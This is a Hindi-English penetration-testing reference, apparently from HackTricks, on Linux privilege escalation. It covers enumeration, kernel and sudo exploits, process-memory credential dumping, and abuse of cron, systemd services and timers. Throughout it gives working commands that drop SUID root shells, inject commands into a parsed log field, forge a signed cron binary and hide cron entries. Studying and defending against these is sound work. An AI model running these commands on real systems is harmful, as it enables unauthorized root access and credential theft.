# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS info

आइए पहले OS के बारे में कुछ जानकारी हासिल करना शुरू करें जो चल रहा है
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास `PATH` वेरिएबल के अंदर किसी भी फ़ोल्डर पर **write permissions** हैं, तो आप कुछ libraries या binaries को hijack करने में सक्षम हो सकते हैं:
```bash
echo $PATH
```
### Env info

environment variables में कोई interesting information, passwords, या API keys?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version check करें और देखें कि क्या कोई exploit है जिसका उपयोग privileges escalate करने के लिए किया जा सकता है
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits) में एक अच्छी vulnerable kernel list और कुछ पहले से **compiled exploits** पा सकते हैं।\
जहां आप कुछ **compiled exploits** पा सकते हैं, ऐसे अन्य sites: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस web से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
कर्नेल exploits खोजने में मदद करने वाले tools हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर execute करें, केवल kernel 2.x के exploits check करता है)

हमेशा **kernel version को Google में search करें**, हो सकता है आपका kernel version किसी kernel exploit में लिखा हो और तब आपको यकीन हो जाएगा कि यह exploit valid है।

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

में दिखाई देने वाले vulnerable sudo versions के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके देख सकते हैं कि sudo का version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 से पहले के Sudo संस्करण (**1.9.14 - 1.9.17 < 1.9.17p1**) अप्रिविलेज्ड लोकल यूज़र्स को `/etc/nsswitch.conf` फ़ाइल को user controlled directory से इस्तेमाल किए जाने पर sudo `--chroot` option के जरिए अपने privileges को root तक escalate करने की अनुमति देते हैं।

यहां एक [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) है, जिससे इस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) को exploit किया जा सकता है। exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` version vulnerable है और वह `chroot` feature को support करता है।

अधिक जानकारी के लिए, original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 से पहले का Sudo (reported affected range: **1.8.8–1.9.17**) **sudo -h <host>** से दिए गए **user-supplied hostname** का उपयोग करके host-based sudoers rules evaluate कर सकता है, बजाय **real hostname** के। अगर sudoers किसी दूसरे host पर broader privileges देता है, तो आप locally उस host को **spoof** कर सकते हैं।

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules (host is neither the current hostname nor `ALL`)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
allowed host को spoof करके exploit करें:
```bash
sudo -h devbox id
sudo -h devbox -i
```
यदि spoofed name का resolution block हो, तो उसे `/etc/hosts` में जोड़ें या ऐसा hostname इस्तेमाल करें जो पहले से logs/configs में मौजूद हो ताकि DNS lookups avoid हों।

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

इस vuln को exploit करने के **example** के लिए **HTB** के **smasher2 box** को देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित defenses का enumerate करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## कंटेनर ब्रेकआउट

अगर आप एक container के अंदर हैं, तो नीचे दिए गए container-security section से शुरू करें और फिर runtime-specific abuse pages पर pivot करें:


{{#ref}}
container-security/
{{#endref}}

## ड्राइव्स

जांचें कि **क्या mounted है और क्या unmounted है**, कहाँ और क्यों। अगर कुछ भी unmounted है, तो आप उसे mount करने की कोशिश कर सकते हैं और private info की जांच कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी software

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जांचें कि **कोई compiler installed** है या नहीं। यह उपयोगी है अगर आपको कोई kernel exploit इस्तेमाल करना हो, क्योंकि इसे उसी machine पर compile करना recommended है जहां आप इसे use करने वाले हैं (या किसी similar machine पर)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

**installed packages and services** के **version** की जांच करें। शायद कोई पुराना Nagios version (उदाहरण के लिए) हो, जिसका उपयोग privileges बढ़ाने के लिए exploit किया जा सके…\
ज़्यादा suspicious installed software के version को manually check करना recommended है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन का SSH access है, तो आप मशीन के अंदर installed outdated और vulnerable software को check करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी information दिखाएँगे जो ज़्यादातर बेकार होगी, इसलिए OpenVAS या इसी तरह के applications recommended हैं जो check करेंगे कि किसी installed software version में known exploits के प्रति vulnerability है या नहीं_

## Processes

देखें कि **कौन-से processes** execute हो रहे हैं और check करें कि क्या किसी process के पास **उससे ज़्यादा privileges** हैं जितने होने चाहिए (शायद कोई tomcat root द्वारा execute हो रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) की जांच करें। **Linpeas** इन्हें process की command line के अंदर `--inspect` parameter को देखकर detect करते हैं।\
साथ ही processes के binaries पर अपने privileges भी check करें, शायद आप किसी की overwrite कर सकते हैं।

### Cross-user parent-child chains

किसी **different user** के under चल रहा child process, अपने parent की तुलना में, अपने आप में malicious नहीं होता, लेकिन यह एक उपयोगी **triage signal** है। कुछ transitions expected होते हैं (`root` द्वारा service user spawn करना, login managers द्वारा session processes बनाना), लेकिन unusual chains wrappers, debug helpers, persistence, या weak runtime trust boundaries को reveal कर सकते हैं।

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
यदि आपको कोई surprising chain मिले, तो parent command line और उसके व्यवहार को प्रभावित करने वाली सभी files (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments) की जांच करें। कई real privesc paths में child खुद writable नहीं था, लेकिन **parent-controlled config** या helper chain writable थी।

### Deleted executables and deleted-open files

Runtime artifacts अक्सर deletion के **बाद भी** accessible रहते हैं। यह privilege escalation के लिए भी उपयोगी है और उस process से evidence recover करने के लिए भी, जिसके पास पहले से sensitive files open हैं।

Deleted executables के लिए जांचें:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
यदि `/proc/<PID>/exe` `(deleted)` की ओर point करता है, तो process अभी भी memory से पुराना binary image चला रहा है। यह जांच करने का एक मजबूत संकेत है क्योंकि:

- हटाई गई executable में interesting strings या credentials हो सकते हैं
- चल रहा process अभी भी useful file descriptors expose कर सकता है
- एक deleted privileged binary हाल की tampering या attempted cleanup का संकेत दे सकता है

deleted-open files को globally collect करें:
```bash
lsof +L1
```
यदि आप कोई दिलचस्प descriptor पाते हैं, तो उसे सीधे recover करें:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
This is especially valuable when a process still has a deleted secret, script, database export, or flag file open.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाता है कि memory उस process के** virtual address space में कैसे mapped है; यह **हर mapped region की permissions** भी दिखाता है। **mem** pseudo file **process की memory को ही expose करता है**। **maps** file से हमें पता चलता है कि कौन-से **memory regions readable** हैं और उनके offsets क्या हैं। हम इस जानकारी का उपयोग **mem file में seek करने और सभी readable regions को dump करने** के लिए करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **physical** memory तक access प्रदान करता है, virtual memory तक नहीं। kernel के virtual address space को /dev/kmem का उपयोग करके access किया जा सकता है।\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा readable होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### linux के लिए ProcDump

ProcDump, Windows के लिए Sysinternals suite के classic ProcDump tool का Linux reimagining है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) में प्राप्त करें
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

किसी process memory को dump करने के लिए आप उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप manually root requirements हटा सकते हैं और उस process को dump कर सकते हैं जो आपके own है
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) से Script A.5 (root required है)

### Credentials from Process Memory

#### Manual example

यदि आपको पता चलता है कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (memory of a process को dump करने के अलग-अलग तरीकों के लिए पहले के sections देखें) और memory के अंदर credentials search कर सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **memory** और कुछ **well known files** से clear text credentials चुराएगा। सही तरीके से काम करने के लिए इसे root privileges चाहिए।

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) root के रूप में चल रहा है – web-based scheduler privesc

अगर कोई web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और सिर्फ loopback से bound है, तो आप फिर भी SSH local port-forwarding के जरिए उस तक पहुंच सकते हैं और privilege escalate करने के लिए एक privileged job बना सकते हैं।

Typical chain
- loopback-only port खोजें (जैसे, 127.0.0.1:8000) और Basic-Auth realm `ss -ntlp` / `curl -v localhost:8000` के जरिए देखें
- operational artifacts में credentials खोजें:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और उसे तुरंत चलाएं (SUID shell ड्रॉप करता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; एक dedicated user और minimal permissions के साथ constrain करें
- localhost पर bind करें और अतिरिक्त रूप से firewall/VPN के जरिए access restrict करें; passwords reuse न करें
- unit files में secrets embed करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging enable करें



जाँचें कि कोई scheduled job vulnerable है या नहीं। शायद आप root द्वारा execute हो रहे किसी script का फायदा उठा सकते हैं (wildcard vuln? क्या उन files को modify कर सकते हैं जिनका root उपयोग करता है? symlinks इस्तेमाल कर सकते हैं? directory में specific files create कर सकते हैं जिसका root उपयोग करता है?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
यदि `run-parts` उपयोग किया जाता है, तो जाँचें कि कौन-से नाम वास्तव में execute होंगे:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
यह false positives से बचाता है। एक writable periodic directory केवल तभी उपयोगी है जब आपका payload filename स्थानीय `run-parts` rules से मेल खाता हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आपको PATH मिल सकता है: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user "user" के पास /home/user पर writing privileges हैं_)

अगर इस crontab के अंदर root user path सेट किए बिना कोई command या script execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप इसका उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि root द्वारा निष्पादित होने वाली किसी script के अंदर किसी command में “**\***” है, तो आप इसका फायदा उठाकर unexpected चीज़ें कर सकते हैं (जैसे privesc). Example:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**अगर wildcard से पहले कोई path जैसे** _**/some/path/\***_ **हो, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं है).**

और wildcard exploitation के और tricks के लिए यह page पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash arithmetic evaluation से पहले `((...))`, `$((...))` और `let` में parameter expansion और command substitution करता है। अगर कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में feed करता है, तो attacker एक command substitution `$(...)` inject कर सकता है जो cron चलने पर root के रूप में execute होगी।

- यह क्यों काम करता है: Bash में expansions इस order में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion। इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसी value पहले substitute होती है (command चलती है), फिर बचा हुआ numeric `0` arithmetic के लिए use होता है, इसलिए script बिना errors के आगे चलती रहती है।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: attacker-controlled text को parsed log में लिखवाएँ ताकि numeric-looking field में command substitution हो और वह किसी digit पर end हो। सुनिश्चित करें कि आपका command stdout पर print न करे (या उसे redirect करें) ताकि arithmetic valid रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

अगर आप root द्वारा execute होने वाले किसी cron script को **modify** कर सकते हैं, तो आप बहुत आसानी से shell पा सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा निष्पादित script एक **ऐसी directory** का उपयोग करती है जहाँ आपका full access है, तो शायद उस folder को delete करना और **उसकी जगह किसी दूसरी directory की symlink folder बनाना** उपयोगी हो सकता है, जो आपकी control वाली script serve करती हो
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation and safer file handling

जब privileged scripts/binaries की समीक्षा करें जो path by files को read या write करते हैं, तो जांचें कि links कैसे handle किए जाते हैं:

- `stat()` एक symlink को follow करता है और target की metadata लौटाता है।
- `lstat()` link की अपनी metadata लौटाता है।
- `readlink -f` और `namei -l` final target resolve करने में मदद करते हैं और path के हर component की permissions दिखाते हैं।
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: अगर path पहले से मौजूद हो तो fail करें (attacker द्वारा पहले से बनाए गए links/files को block करता है).
- `openat()`: trusted directory file descriptor के relative operate करें.
- `mkstemp()`: secure permissions के साथ temporary files atomic तरीके से create करें.

### Custom-signed cron binaries with writable payloads
Blue teams कभी-कभी cron-driven binaries को "sign" करते हैं by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

आप processes को monitor कर सकते हैं ताकि ऐसे processes खोजे जा सकें जो हर 1, 2 या 5 minutes में execute हो रहे हैं. शायद आप इसका फायदा उठाकर privileges escalate कर सकें.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **का भी उपयोग कर सकते हैं** (यह शुरू होने वाली हर process को monitor और list करेगा)।

### Root backups जो attacker-set mode bits को preserve करते हैं (pg_basebackup)

अगर root-owned cron किसी database directory के against `pg_basebackup` (या किसी भी recursive copy) को wrap करता है, जिसे आप write कर सकते हैं, तो आप एक **SUID/SGID binary** plant कर सकते हैं, जिसे backup output में same mode bits के साथ **root:root** के रूप में फिर से copy किया जाएगा।

Typical discovery flow (एक low-priv DB user के रूप में):
- `pspy` का उपयोग करके एक root cron को देखें जो हर minute कुछ ऐसा call कर रहा हो: `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Confirm करें कि source cluster (जैसे `/var/lib/postgresql/14/main`) आपके लिए writable है और destination (`/opt/backups/current`) job के बाद root-owned हो जाता है।

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
यह काम करता है क्योंकि `pg_basebackup` क्लस्टर को कॉपी करते समय file mode bits को preserve करता है; जब इसे root द्वारा invoke किया जाता है, तो destination files को **root ownership + attacker-chosen SUID/SGID** inherit होते हैं। permissions को बनाए रखने वाली और executable location में लिखने वाली कोई भी similar privileged backup/copy routine vulnerable होती है।

### Invisible cron jobs

carriage return को comment के बाद **(newline character के बिना)** डालकर cronjob बनाना संभव है, और cron job काम करेगा। Example (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
इस तरह की stealth entry का पता लगाने के लिए, cron files को ऐसे tools से inspect करें जो control characters को expose करते हैं:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

जांचें कि क्या आप किसी `.service` फ़ाइल में लिख सकते हैं, अगर कर सकते हैं, तो आप इसे **modify** कर सकते हैं ताकि यह service के **started**, **restarted** या **stopped** होने पर आपका **backdoor** **execute** करे (शायद आपको machine के reboot होने तक wait करना पड़े)।\
उदाहरण के लिए `.service` फ़ाइल के अंदर अपना backdoor बनाएं, **`ExecStart=/tmp/script.sh`** के साथ

### Writable service binaries

ध्यान रखें कि अगर आपके पास services द्वारा **execute** किए जाने वाले binaries पर **write permissions** हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि services के फिर से **execute** होने पर backdoors **execute** हो जाएं।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को इस तरह देख सकते हैं:
```bash
systemctl show-environment
```
यदि आपको पता चलता है कि आप path के किसी भी folder में **write** कर सकते हैं, तो आप **escalate privileges** कर सकते हैं। आपको **service configurations** files में उपयोग हो रहे **relative paths** को search करना होगा, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, systemd PATH folder में, जिसमें आप लिख सकते हैं, relative path binary के समान नाम के साथ एक **executable** बनाएं, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने के लिए कहा जाए, तो आपका **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).

**`man systemd.service` के साथ services के बारे में अधिक जानें।**

## **Timers**

**Timers** ऐसे systemd unit files हैं जिनका नाम `**.timer**` पर समाप्त होता है, जो `**.service**` files या events को control करते हैं। **Timers** cron के alternative के रूप में उपयोग किए जा सकते हैं क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है, और इन्हें asynchronously run किया जा सकता है।

आप सभी timers को इस तरह enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य timers

यदि आप किसी timer को modify कर सकते हैं, तो आप उसे systemd.unit के कुछ existing components (जैसे `.service` या `.target`) execute करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि Unit क्या है:

> वह unit जिसे यह timer समाप्त होने पर activate करता है। यह argument एक unit name है, जिसका suffix ".timer" नहीं होता। यदि specify नहीं किया गया हो, तो यह value उसी नाम वाली service पर default होती है जैसी timer unit की होती है, सिवाय suffix के। (ऊपर देखें।) यह recommended है कि activated होने वाली unit name और timer unit की unit name एक जैसी हों, सिवाय suffix के।

इसलिए, इस permission का abuse करने के लिए आपको यह करना होगा:

- कोई systemd unit (जैसे `.service`) खोजना जो एक writable binary execute कर रही हो
- कोई systemd unit खोजना जो एक relative path execute कर रही हो और आपके पास **systemd PATH** पर **writable privileges** हों (उस executable की impersonate करने के लिए)

**timers के बारे में और जानें `man systemd.timer` से।**

### **Timer को Enable करना**

Timer को enable करने के लिए आपको root privileges चाहिए और execute करना होगा:
```bash
sudo systemctl enable backu2.timer
